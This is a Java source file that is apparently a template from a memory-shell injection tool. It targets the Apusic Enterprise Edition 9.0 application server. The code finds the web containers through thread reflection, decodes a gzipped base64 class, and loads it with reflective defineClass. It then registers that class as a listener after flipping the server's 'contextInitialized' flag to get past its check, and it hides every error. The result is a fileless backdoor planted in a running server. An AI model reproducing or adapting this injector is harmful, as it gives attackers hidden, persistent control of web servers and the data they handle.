package jmg.core.template;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * Apusic Listener 注入器
 * Author: pen4uin
 * Tested version：Apusic Enterprise Edition 9.0 SP5
 */
public class ApusicListenerInjectorTpl {


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new ApusicListenerInjectorTpl();
    }

    public ApusicListenerInjectorTpl() {
        try {
            List<Object> containers = getContainer();
            for (Object container : containers) {
                Object listener = getListener(container);
                addListener(container, listener);
            }
        } catch (Exception ignored) {

        }

    }

    public List<Object> getContainer() throws Exception {
        List<Object> containers = new ArrayList<Object>();
        Thread[] threads = getThreads();
        try {
            for (Thread thread : threads) {
                if (thread.getClass().getName().contains("DefaultSessionManager")) {
                    Object container = getFV(getFV(thread, "this$0"), "container");
                    if (container.getClass().getName().contains("WebContainer")) {
                        containers.add(container);
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return containers;
    }
    public Thread[] getThreads(){
        Thread[] var0 = null;

        try {
            var0 = (Thread[])(invokeMethod(Thread.class, "getThreads"));
        } catch (Exception var3) {
            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
            var0 = new Thread[var2.activeCount()];
            var2.enumerate(var0);
        }

        return var0;
    }

    private Object getListener(Object container) throws Exception {
        Object listener = null;
        ClassLoader loader = (ClassLoader) invokeMethod(container, "getClassLoader");

        try {
            listener = loader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(loader, clazzByte, 0, clazzByte.length);
            listener = clazz.newInstance();
        }
        return listener;
    }


    void addListener(Object container, Object listener) throws Exception {
        if (isInjected(container, listener.getClass().getName())) {
            return;
        }
        // bypass com.apusic.web.container.WebContainer.checkContextInitialized()
        setFV(container, "contextInitialized", false);
        invokeMethod(container, "addListener", new Class[]{Class.class}, new Object[]{listener.getClass()});
        // recover com.apusic.web.container.WebContainer.contextInitialized
        setFV(container, "contextInitialized", true);
    }

    boolean isInjected(Object container, String listenerName) throws Exception {
        Object flag = invokeMethod(getFV(container, "webapp"), "hasListener", new Class[]{String.class}, new Object[]{listenerName});
        return Boolean.parseBoolean(flag.toString());
    }


    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    synchronized void setFV(Object var0, String var1, Object val) throws Exception {
        getF(var0, var1).set(var0, val);
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }


    static synchronized Object invokeMethod(Object targetObject, String methodName) throws Exception {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws Exception {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

}
